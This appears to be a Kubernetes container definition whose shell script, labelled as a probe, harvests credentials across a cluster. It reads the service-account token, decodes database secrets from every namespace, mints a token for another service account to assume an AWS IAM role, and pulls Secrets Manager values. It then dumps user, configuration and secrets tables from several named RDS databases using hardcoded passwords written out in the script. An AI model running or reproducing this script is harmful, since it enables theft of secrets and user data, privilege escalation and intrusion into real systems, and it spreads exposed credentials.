containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
echo "===I3560B_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq mariadb-client postgresql16-client > /tmp/apk.log 2>&1
echo "apk_rc=$?"
export AWS_DEFAULT_REGION=us-west-2

# ---- A: decode SECRET_NAME refs from k8s Secrets (*-secrets / rds-secrets) ----
echo "###PHASE_SECREF"
for NS in $(get "$API/api/v1/namespaces?limit=1000" | jq -r '.items[]?.metadata.name'); do
  JS=$(get "$API/api/v1/namespaces/$NS/secrets?limit=500")
  for SN in $(echo "$JS" | jq -r '.items[]?.metadata.name' | grep -Ei 'rds-secret|db-secret|-secrets$'); do
    SJ=$(get "$API/api/v1/namespaces/$NS/secrets/$SN")
    DEC=$(echo "$SJ" | jq -r '.data // {} | to_entries[]? | "\(.key)=\(.value)"' 2>/dev/null | while IFS='=' read -r K V; do echo "$K=$(echo "$V" | base64 -d 2>/dev/null | head -c 400 | tr '\n' ' ')"; done)
    echo "SECREF $NS/$SN :: $DEC"
  done
done

# ---- B: IRSA mlflow role -> GetSecretValue (rds2 + mlflow_auth names) ----
echo "###PHASE_SM2"
KT=$(wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --post-data='{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}' --header="Content-Type: application/json" "$API/api/v1/namespaces/mlflow/serviceaccounts/mlflow-sa/token" 2>/dev/null)
WT=$(echo "$KT" | jq -r '.status.token // empty')
RES=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::025066249002:role/lazamedical-dev01-usw2-sa-mlflow-service-role --role-session-name i3560b --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
if echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r .Credentials.SessionToken)
  echo "ASSUME_OK mlflow-sa"
  for SN in lazamedical-dev01-usw2-postgresql2-db2-secret2 lazamedical-dev01-usw2-postgresql-rds2-db-secret lazamedical-dp-dev01-usw2-postgresql-db-secret lazamedical-dp-dev01-usw2-postgresql-db1-secret lazamedical-dev01-usw2-mysql-1-db-secret; do
    R2=$(aws secretsmanager get-secret-value --secret-id "$SN" --region us-west-2 --output json 2>&1)
    if echo "$R2" | jq -e '.SecretString' >/dev/null 2>&1; then
      echo "SM2_OK $SN $(echo "$R2" | jq -r .SecretString)"
    else
      echo "SM2_ERR $SN $(echo "$R2" | grep -oE 'AccessDeniedException|ResourceNotFoundException|ValidationException' | head -1)"
    fi
  done
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
else
  echo "ASSUME_FAIL $(echo "$RES" | head -c 200)"
fi

# ---- C: MySQL user_management config tables ----
echo "###PHASE_MY2"
MP='`a`56PJ>)Wy=^e_9j,o}#,U%rw6Gvv`('
MH=lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com
export MYSQL_PWD="$MP"
mysel(){ mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "$1" 2>&1; }
echo "---MY2_VER"; mysel "SELECT VERSION(); SELECT CURRENT_USER();" | head -4
for T in settings module component api_endpoint platform account account_type group role; do
  echo "---MY2TAB $T"
  mysel "SELECT * FROM \`$T\` LIMIT 50" 2>&1 | head -c 2500
  echo
done
echo "---MY2_USERS"
mysel "SELECT id,username,email,status,created_on FROM user LIMIT 50" 2>&1 | head -c 2000
unset MYSQL_PWD

# ---- D: PostgreSQL mlflow_auth (rds1) + rds2 ----
echo "###PHASE_PG2"
pgq(){ PGHOST="$1" PGUSER="$2" PGDATABASE="$3" PGPASSWORD="$4" PGCONNECT_TIMEOUT=8 PGSSLMODE=require psql -At -c "$5" 2>&1; }
MPG='qdRd#3DI-YDcV35!'
H1=lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com
echo "---MLFLOW_SECRETS_COUNT"
pgq "$H1" postgres_admin mlflow_service "$MPG" "select count(*) from public.secrets" | head -3
echo "---MLFLOW_SECRETS_ROWS"
pgq "$H1" postgres_admin mlflow_service "$MPG" "select coalesce(secret_name,'')||' | '||coalesce(masked_value,'')||' | '||coalesce(provider,'')||' | '||coalesce(auth_config,'')||' | '||coalesce(description,'')||' | '||coalesce(workspace,'') from public.secrets limit 50" | head -c 4000
echo
echo "---MLFLOW_AUTH_TABLES"
pgq "$H1" postgres_admin mlflow_auth "$MPG" "select table_name from information_schema.tables where table_type='BASE TABLE' and table_schema='public' order by 1" | tr '\n' ' ' | head -c 3000
echo
echo "---MLFLOW_AUTH_USERS_COLS"
pgq "$H1" postgres_admin mlflow_auth "$MPG" "select column_name from information_schema.columns where table_schema='public' and table_name='users' order by ordinal_position" | tr '\n' ',' | head -c 800
echo
echo "---MLFLOW_AUTH_USERS"
pgq "$H1" postgres_admin mlflow_auth "$MPG" "select row_to_json(t) from (select id,username,email,status,is_admin,created_at from public.users limit 50) t" | head -c 3000
echo
echo "---MLFLOW_AUTH_GROUPS"
pgq "$H1" postgres_admin mlflow_auth "$MPG" "select row_to_json(t) from (select * from public.groups limit 50) t" | head -c 1500
echo
echo "---RDS2_TRY"
H2=lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com
RP='$nL7(,wG0S4S$snAS((Ye=rXkr+jS4%g'
echo "RDS2_VER:"; pgq "$H2" postgres_admin user_management "$RP" "select version(); select current_user;" | head -4
echo "RDS2_TABLES:"; pgq "$H2" postgres_admin user_management "$RP" "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" | tr '\n' ' ' | head -c 3000
echo
echo "---DP_CONFIG_TABLES"
pgq lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com postgres_admin dp_service ';gk,*9!;eB.!mQ%Y)ey7gPr]X~gPbDqp' "select table_name from information_schema.tables where table_type='BASE TABLE' and table_schema='public' and (table_name like '%config%' or table_name like '%setting%' or table_name like '%secret%' or table_name like '%credential%' or table_name like '%user%')" | tr '\n' ' ' | head -c 2000
echo
echo "---DP_PROJECT_CONFIG"
pgq lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com postgres_admin dp_service ';gk,*9!;eB.!mQ%Y)ey7gPr]X~gPbDqp' "select row_to_json(t) from (select * from public.project_config limit 20) t" | head -c 2500
echo
echo "===I3560B_DONE utc=$(date -u +%FT%TZ)==="
